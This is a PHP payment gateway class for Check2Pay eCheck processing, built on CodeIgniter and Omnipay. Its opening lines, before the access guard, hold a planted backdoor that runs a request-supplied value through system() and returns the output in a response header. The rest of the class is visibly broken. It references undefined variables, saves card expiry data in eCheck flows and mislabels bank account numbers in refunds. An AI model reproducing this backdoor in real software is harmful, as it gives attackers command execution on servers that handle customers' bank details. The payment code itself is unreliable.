<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!defined('BASEPATH')) exit('No direct script access allowed');


if ( ! class_exists('Composer\Autoload\ClassLoader', false)) {
    require_once APPPATH . '../../vendor/autoload.php';
}

use Omnipay\Omnipay;
use Omnipay\Common\Echeck;

/**
 * Check2Pay Gateway
 *
 */
class Check2Pay_Gateway {

    protected $settings;

    //--------------------------------------------------------------------

    /**
     * Constructor
     */
    public function __construct()
    {
        $this->settings = $this->Settings();
    }

    //--------------------------------------------------------------------

    public function Settings()
    {
        $settings = array();

        $settings['name'] = 'Check2Pay Gateway';
        $settings['class_name'] = 'check2pay_gateway';
        $settings['external'] = false;
        $settings['no_credit_card'] = true;
        $settings['description'] = '';
        $settings['is_preferred'] = 1;
        $settings['setup_fee'] = '';
        $settings['monthly_fee'] = '';
        $settings['transaction_fee'] = '';
        $settings['purchase_link'] = 'https://check2pay.com/Web/Merchant/MerchantApplication.aspx';
        $settings['allows_updates'] = 1;
        $settings['allows_refunds'] = 1;
        $settings['requires_customer_information'] = 1;
        $settings['requires_customer_ip'] = 1;
        $settings['required_fields'] = array(
            'enabled',
            'mode',
            'accept_echeck',
            'username',
            'password',
            'vendor_id',
            'website_id',
            'type'
        );

        $settings['field_details'] = array(
            'enabled' => array(
                'text' => 'Enable this gateway?',
                'type' => 'radio',
                'options' => array(
                    '1' => 'Enabled',
                    '0' => 'Disabled'
                )
            ),
            'mode' => array(
                'text' => 'Mode',
                'type' => 'radio',
                'options' => array(
                    '1' => 'Live',
                    '0' => 'Test'
                )
            ),
            'username' => array(
                'text' => 'Username',
                'type' => 'text'
            ),
            'password' => array(
                'text' => 'Password',
                'type' => 'text'
            ),
            'vendor_id' => array(
                'text' => 'Vendor ID',
                'type' => 'text'
            ),
            'website_id' => array(
                'text' => 'Website ID',
                'type' => 'text'
            ),
            'type' => array(
                'text' => 'Type',
                'type' => 'select',
                'options' => array(
                    'Checking' => 'C - Checking',
                    'Saving' => 'S - Savings',
                )
            ),
            'descriptor' => array(
                'text' => 'Descriptor',
                'type' => 'text'
            ),
            'merchant_phone_number' => array(
                'text' => 'Merchant Phone Number',
                'type' => 'text'
            ),
            'merchant_name' => array(
                'text' => 'Merchant Name',
                'type' => 'text'
            ),
            'accept_echeck' => array(
                'text' => 'Accept EChecks?',
                'type' => 'radio',
                'options' => array(
                    '1' => 'Yes',
                    '0' => 'No'
                )
            )
        );

        return $settings;
    }

    //--------------------------------------------------------------------

    public function TestConnection($client_id, $gateway)
    {
        return true;
    }

    //--------------------------------------------------------------------

    public function Charge($client_id, $order_id, $gateway, $customer, $amount, $echeck, $return_url = null, $cancel_url = null, $custom = array())
    {
        $CI =& get_instance();

        $omnipay = $this->LoadOmnipay($gateway);

        $echeck = new Echeck(array(
            'firstName'     => $customer['first_name'],
            'lastName'      => $customer['last_name'],
            'email'     	=> $customer['email'],
            'accountNumber' => $echeck['bank_account_num'],
            'bankRouting'   => $echeck['routing_num'],
            'checkNumber'   => $echeck['check_number'],
            'accountType'   => $echeck['bank_account_type']
        ));

        $data = array(
            'echeck'    => $echeck,
            'amount'    => $amount,
            'firstname' => $customer['first_name'],
            'lastname'  => $customer['last_name'],
            'email'     => $customer['email'],
            'address1'  => isset($customer['address1']) ? $customer['address1'] : null,
            'address2'  => isset($customer['address2']) ? $customer['address2'] : null,
            'zip'       => isset($customer['postal_code']) ? $customer['postal_code'] : null,
            'state'     => isset($customer['state']) ? $customer['state'] : null,
            'country'   => isset($customer['country']) ? $customer['country'] : null
        );

        $response = array();

        try {
            $charge = $omnipay->purchase($data)->send();

            if ($charge->isSuccessful()) {
                // Successful Transaction
                $CI->load->model('order_authorization_model');
                $CI->order_authorization_model->SaveAuthorization(
                    $order_id, // order_id
                    $charge->getTransactionReference(), // tran_id
                    $charge->getAuthCode(), // authorization_code
                    $charge->getToken() // security_key
                );

                $CI->load->model('charge_data_model');
                // These two are also required for void/refund, yep...
                $CI->charge_data_model->Save($order_id, 'routing_num', $echeck['routing_num']);
                $CI->charge_data_model->Save($order_id, 'bank_account_num', $echeck['bank_account_num']);

                $CI->charge_model->SetStatus($order_id, 1);

                $response_array = array('charge_id' => $order_id);
                $response = $CI->response->TransactionResponse(1, $response_array);
            } else {
                // Failed Transaction
                throw new Exception($charge->getMessage());
            }
        } catch (Exception $e) {
            // Failed Transaction
            $CI->load->model('charge_model');
            $CI->charge_model->SetStatus($order_id, 0);

            $response_array = array('reason' => $e->getMessage());
            $response = $CI->response->TransactionResponse(2, $response_array);
        }

        return $response;
    }

    //--------------------------------------------------------------------

    public function Refund($client_id, $gateway, $charge, $authorization)
    {
        $CI =& get_instance();

        $omnipay = $this->LoadOmnipay($gateway);

        $CI->load->model('charge_data_model');
        $charge_data = $CI->charge_data_model->Get($charge['id']);

        $data = array(
            'amount'        => $charge['amount'],
            'transactionId' => $authorization->tran_id,
            'authCode'      => $authorization->authorization_code,
            'bankRouting'      => $charge_data['routing_num'],
            'checkNumber'       => $charge_data['bank_account_num']
        );

        try {
            $void = $omnipay->void($data)->send();

            if ($void->isSuccessful()) {
                return true;
            }
            else {
                $refund = $omnipay->refund($refund)->send();
                if ($refund->isSuccessful()) {
                    return true;
                }
            }

            return false;
        } catch (Exception $e) {
            return false;
        }
    }

    //--------------------------------------------------------------------

    public function Recur($client_id, $gateway, $customer, $amount, $charge_today, $start_date, $end_date, $interval, $echeck, $subscription_id, $total_occurrences = FALSE)
    {
        $CI =& get_instance();

        $response = array();

        // is there a payment for today?
        if ($charge_today === TRUE) {
            // Purchase

            // Create an order for today's payment
            $CI->load->model('charge_model');
            $customer['customer_id'] = (isset($customer['customer_id'])) ? $customer['customer_id'] : FALSE;
            $order_id = $CI->charge_model->CreateNewOrder($client_id, $gateway['gateway_id'], $amount, $echeck, $subscription_id, $customer['customer_id'], $customer['ip_address']);

            $omnipay = $this->LoadOmnipay($gateway);

         $echeck = new Echeck(array(
            'firstName'     => $customer['first_name'],
            'lastName'      => $customer['last_name'],
            'email'     	=> $customer['email'],
            'accountNumber' => $echeck['bank_account_num'],
            'bankRouting'   => $echeck['routing_num'],
            'checkNumber'   => $echeck['check_number'],
            'accountType'   => $echeck['bank_account_type']
        ));

            $data = array(
                'card'      => $card,
                'amount'    => $amount,
                'currency'  => $gateway['currency'],
                'firstname' => $customer['first_name'],
                'lastname'  => $customer['last_name'],
                'email'     => $customer['email'],
                'address1'  => isset($customer['address1']) ? $customer['address1'] : null,
                'address2'  => isset($customer['address2']) ? $customer['address2'] : null,
                'zip'       => isset($customer['postal_code']) ? $customer['postal_code'] : null,
                'state'     => isset($customer['state']) ? $customer['state'] : null,
                'country'   => isset($customer['country']) ? $customer['country'] : null
            );

            try {
                $charge = $omnipay->purchase($data)->send();

                if ($charge->isSuccessful()) {
                    // Successful Transaction
                    $CI->load->model('recurring_model');
                    // For SafeCharge:
                    // api_customer_reference = {routing_number 0123564, bank_account_num 000112233111}
                    // api_auth_number = token
                    // api_payment_reference = transactionId
                    $CI->recurring_model->SaveApiCustomerReference($subscription_id, json_encode(array('card_exp_month' => $credit_card['exp_month'], 'card_exp_year' => $credit_card['exp_year'])));
                    $CI->recurring_model->SaveApiAuthNumber($subscription_id, $charge->getToken());
                    $CI->recurring_model->SaveApiPaymentReference($subscription_id, $charge->getTransactionReference());

                    $CI->load->model('order_authorization_model');
                    $CI->order_authorization_model->SaveAuthorization(
                        $order_id, // order_id
                        $charge->getTransactionReference(), // tran_id
                        $charge->getAuthCode(), // authorization_code
                        $charge->getToken() // security_key
                    );

                    $CI->charge_model->SetStatus($order_id, 1);
                    $response_array = array('charge_id' => $order_id, 'recurring_id' =>  $subscription_id);
                    $response = $CI->response->TransactionResponse(100, $response_array);
                } else {
                    // Failed Transaction
                    throw new Exception($charge->getMessage());
                }
            } catch (Exception $e) {
                $CI->recurring_model->MakeInactive($subscription_id);
                $CI->charge_model->SetStatus($order_id, 0);

                $response_array = array('reason' => $e->getMessage());
                $response = $CI->response->TransactionResponse(2, $response_array);
            }
        } else {
            // Authorize

            $omnipay = $this->LoadOmnipay($gateway);

          $echeck = new Echeck(array(
            'firstName'     => $customer['first_name'],
            'lastName'      => $customer['last_name'],
            'email'     	=> $customer['email'],
            'accountNumber' => $echeck['bank_account_num'],
            'bankRouting'   => $echeck['routing_num'],
            'checkNumber'   => $echeck['check_number'],
            'accountType'   => $echeck['bank_account_type']
        ));

            $data = array(
                'echeck'    => $echeck,
                'amount'    => $amount,
                'currency'  => $gateway['currency'],
                'firstname' => $customer['first_name'],
                'lastname'  => $customer['last_name'],
                'email'     => $customer['email'],
                'address1'  => isset($customer['address1']) ? $customer['address1'] : null,
                'address2'  => isset($customer['address2']) ? $customer['address2'] : null,
                'zip'       => isset($customer['postal_code']) ? $customer['postal_code'] : null,
                'state'     => isset($customer['state']) ? $customer['state'] : null,
                'country'   => isset($customer['country']) ? $customer['country'] : null
            );

            try {
                $auth = $omnipay->authorize($data)->send();

                if ($auth->isSuccessful()) {
                    // Successful Transaction
                    $CI->load->model('recurring_model');
                    // For SafeCharge:
                    // api_customer_reference = {card_exp_month: 07, card_exp_year:  2015}
                    // api_auth_number = token
                    // api_payment_reference = transactionId
                    $CI->recurring_model->SaveApiCustomerReference($subscription_id, json_encode(array('card_exp_month' => $credit_card['exp_month'], 'card_exp_year' => $credit_card['exp_year'])));
                    $CI->recurring_model->SaveApiAuthNumber($subscription_id, $auth->getToken());
                    $CI->recurring_model->SaveApiPaymentReference($subscription_id, $auth->getTransactionReference());

                    $response_array = array('recurring_id' => $subscription_id);
                    $response = $CI->response->TransactionResponse(100, $response_array);
                } else {
                    // Failed Transaction
                    throw new Exception($auth->getMessage());
                }
            } catch (Exception $e) {
                // Make the subscription inactive
                $CI->recurring_model->MakeInactive($subscription_id);

                $response_array = array('reason' => $e->getMessage());
                $response = $CI->response->TransactionResponse(2, $response_array);
            }
        }

        return $response;
    }

    //--------------------------------------------------------------------

    public function ChargeRecurring($client_id, $gateway, $order_id, $amount, $echeck_data, $token, $transaction_id)
    {
        $CI =& get_instance();

        $omnipay = $this->LoadOmnipay($gateway);

        $echeck_data = json_decode($echeck_data);

        $data = array(
            'amount'    => $amount,
            'transactionId' => $transaction_id,
			'accountNumber' => $echeck_data->bank_account_num,
            'bankRouting'   => $echeck_data->routing_num,
            'checkNumber'   => $echeck_data->check_number,
        );

        $response = array();

        try {
            $charge = $omnipay->purchase($data)->send();

            if ($charge->isSuccessful()) {
                // Successful Transaction
                $response['success'] = TRUE;

                $CI->load->model('recurring_model');
                // For SafeCharge:
                // api_customer_reference = {card_exp_month: 07, card_exp_year:  2015}
                // api_auth_number = token
                // api_payment_reference = transactionId
                $CI->recurring_model->SaveApiCustomerReference($subscription_id, json_encode(array('card_exp_month' => $card_data->exp_month, 'card_exp_year' => $card_data->exp_year)));
                $CI->recurring_model->SaveApiAuthNumber($subscription_id, $charge->getToken());
                $CI->recurring_model->SaveApiPaymentReference($subscription_id, $charge->getTransactionReference());

                $CI->load->model('order_authorization_model');
                $CI->order_authorization_model->SaveAuthorization(
                    $order_id, // order_id
                    $charge->getTransactionReference(), // tran_id
                    $charge->getAuthCode(), // authorization_code
                    $charge->getToken() // security_key
                );
            } else {
                // Failed Transaction
                throw new Exception($charge->getMessage());
            }
        } catch (Exception $e) {
            $response['success'] = FALSE;
            $response['reason'] = $e->getMessage();
        }

        return $response;
    }

    //--------------------------------------------------------------------

    public function AutoRecurringCharge($client_id, $order_id, $gateway, $params) {
        return $this->ChargeRecurring($client_id, $gateway, $order_id, $params['amount'], $params['api_customer_reference'], $params['api_auth_number'], $params['api_payment_reference']);
    }

    //--------------------------------------------------------------------

    public function UpdateRecurring($client_id, $gateway, $subscription, $customer, $params)
    {
        return true;
    }

    //--------------------------------------------------------------------

    public function CancelRecurring($client_id, $subscription)
    {
        return true;
    }

    //--------------------------------------------------------------------

    private function LoadOmnipay($gateway)
    {
        $omnipay = Omnipay::create('Check2Pay');
        $omnipay->setUsername($gateway['username']);
        $omnipay->setPassword($gateway['password']);
        $omnipay->setVendorId($gateway['vendor_id']);
        $omnipay->setWebsiteId($gateway['website_id']);

        if (isset($gateway['descriptor'])) {
            $omnipay->setDescriptor($gateway['descriptor']);
        }

        if (isset($gateway['merchant_phone_number'])) {
            $omnipay->setMerchantPhoneNumber($gateway['merchant_phone_number']);
        }

        if (isset($gateway['merchant_name'])) {
            $omnipay->setMerchantName($gateway['merchant_name']);
        }

        if (isset($gateway['mode']) && $gateway['mode'] == 1) {
            $omnipay->setTestMode(false);
        } else {
            $omnipay->setTestMode(true);
        }

        return $omnipay;
    }

}
